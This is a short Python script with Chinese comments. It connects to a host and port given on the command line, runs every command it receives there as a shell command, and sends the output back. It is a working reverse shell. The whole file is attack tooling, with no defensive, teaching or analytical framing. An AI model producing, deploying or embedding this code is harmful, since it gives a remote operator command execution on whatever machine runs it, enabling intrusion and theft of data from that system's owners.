# -*- coding: utf-8 -*-

import argparse
import socket
import subprocess
import sys
import time


def connection(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,int(port)))
    while True:
        data = s.recv(4096)
        try:
            data = data.decode()
            comRst = subprocess.Popen(data,shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            m_stdout, m_stderr = comRst.communicate()
            rst = m_stdout.decode(sys.getfilesystemencoding()).encode()
            if rst == b'':
                rst = b' '
            s.send(rst)
        except Exception as e:
            s.send(str(e).encode())

        time.sleep(1)
    s.close()



if __name__ == '__main__':
    # 命令行参数解析对象
    parser = argparse.ArgumentParser()
    parser.add_argument('-host',dest='hostName',help='Host Name')
    parser.add_argument('-port',dest='conPort',help='Host Port')
    # 解析命令行参数
    args = parser.parse_args()
    host = args.hostName
    port = args.conPort

    if host == None or port == None:
        print(parser.parse_args(['-h']))
        exit(0)

    connection(host, port)